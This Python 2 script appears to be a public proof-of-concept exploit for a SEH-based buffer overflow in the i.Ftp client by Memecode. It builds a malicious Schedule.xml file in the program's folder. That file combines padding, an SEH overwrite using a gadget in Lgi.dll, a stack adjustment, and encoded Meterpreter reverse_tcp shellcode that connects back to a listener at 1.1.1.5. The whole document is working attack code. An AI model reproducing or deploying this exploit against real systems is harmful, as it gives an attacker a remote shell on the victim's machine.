# --------------------------------------
# --------------------------------------
import os,struct,sys
   
outputfile = 'C:\Program Files\Memecode\i.Ftp\Schedule.xml'
size = 20000
offset_to_nseh = 592

junk1 = "A" * offset_to_nseh
nseh = "\xeb\x06\xCC\xCC" # "\xeb\x06" = jmp $+8 = jump to stackadjust
seh = struct.pack('<L',0x10011887) #0x10011887 : pop ecx # pop ecx # ret 0x08 |  {PAGE_EXECUTE_READ} [Lgi.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Memecode\i.Ftp\Lgi.dll)
stackadjust= "\x81\xc4\x24\xfa\xff\xff"	# add esp,-1500
# ./msfvenom -p windows/meterpreter/reverse_tcp exitfunc=thread lhost=1.1.1.5 R -a x86 --platform windows -b '\x00\x0a\x0d\x20\x22\x3c\x3e' -f python
# Found 22 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 308 (iteration=0)
buf =  ""
buf += "\xb8\xca\xa4\x97\xb2\xda\xd7\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x47\x83\xc2\x04\x31\x42\x0f\x03\x42\xc5\x46"
buf += "\x62\x4e\x31\x04\x8d\xaf\xc1\x69\x07\x4a\xf0\xa9\x73"
buf += "\x1e\xa2\x19\xf7\x72\x4e\xd1\x55\x67\xc5\x97\x71\x88"
buf += "\x6e\x1d\xa4\xa7\x6f\x0e\x94\xa6\xf3\x4d\xc9\x08\xca"
buf += "\x9d\x1c\x48\x0b\xc3\xed\x18\xc4\x8f\x40\x8d\x61\xc5"
buf += "\x58\x26\x39\xcb\xd8\xdb\x89\xea\xc9\x4d\x82\xb4\xc9"
buf += "\x6c\x47\xcd\x43\x77\x84\xe8\x1a\x0c\x7e\x86\x9c\xc4"
buf += "\x4f\x67\x32\x29\x60\x9a\x4a\x6d\x46\x45\x39\x87\xb5"
buf += "\xf8\x3a\x5c\xc4\x26\xce\x47\x6e\xac\x68\xac\x8f\x61"
buf += "\xee\x27\x83\xce\x64\x6f\x87\xd1\xa9\x1b\xb3\x5a\x4c"
buf += "\xcc\x32\x18\x6b\xc8\x1f\xfa\x12\x49\xc5\xad\x2b\x89"
buf += "\xa6\x12\x8e\xc1\x4a\x46\xa3\x8b\x02\xab\x8e\x33\xd2"
buf += "\xa3\x99\x40\xe0\x6c\x32\xcf\x48\xe4\x9c\x08\xaf\xdf"
buf += "\x59\x86\x4e\xe0\x99\x8e\x94\xb4\xc9\xb8\x3d\xb5\x81"
buf += "\x38\xc2\x60\x05\x69\x6c\xdb\xe6\xd9\xcc\x8b\x8e\x33"
buf += "\xc3\xf4\xaf\x3b\x0e\x9d\x5a\xc1\xd8\xa3\x9b\xc8\x1d"
buf += "\xcc\x99\xca\x0c\x50\x17\x2c\x44\x78\x71\xe6\xf0\xe1"
buf += "\xd8\x7c\x61\xed\xf6\xf8\xa1\x65\xf5\xfd\x6f\x8e\x70"
buf += "\xee\x07\x7e\xcf\x4c\x81\x81\xe5\xfb\x2d\x14\x02\xaa"
buf += "\x7a\x80\x08\x8b\x4c\x0f\xf2\xfe\xc7\x86\x66\x41\xbf"
buf += "\xe6\x66\x41\x3f\xb1\xec\x41\x57\x65\x55\x12\x42\x6a"
buf += "\x40\x06\xdf\xff\x6b\x7f\x8c\xa8\x03\x7d\xeb\x9f\x8b"
buf += "\x7e\xde\x21\xf7\xa8\x26\x54\x19\x69"
junk2 = "C" * (size-len(junk1+nseh+seh+stackadjust+buf))
poc = junk1 + nseh + seh + stackadjust + buf + junk2
header = "\x3c\x3f\x78\x6d\x6c\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x20\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22"
header += "\x55\x54\x46\x2d\x38\x22\x20\x3f\x3e\x0a\x3c\x53\x63\x68\x65\x64\x75\x6c\x65\x3e\x0a\x09\x3c\x45\x76\x65\x6e\x74\x20\x55"
header += "\x72\x6c\x3d\x22\x22\x20\x54\x69\x6d\x65\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x0a"
footer = "\x22\x20\x46\x6f\x6c\x64\x65\x72\x3d\x22\x22\x20\x2f\x3e\x0a\x3c\x2f\x53\x63\x68\x65\x64\x75\x6c\x65\x3e\x0a"
buffer =  header + poc + footer
print "[+] Creating %s" % outputfile
f = open(outputfile,'wb')
print "[+] Writing %d bytes to file" % len(buffer)
f.write(buffer)
print "[+] Done"
f.close()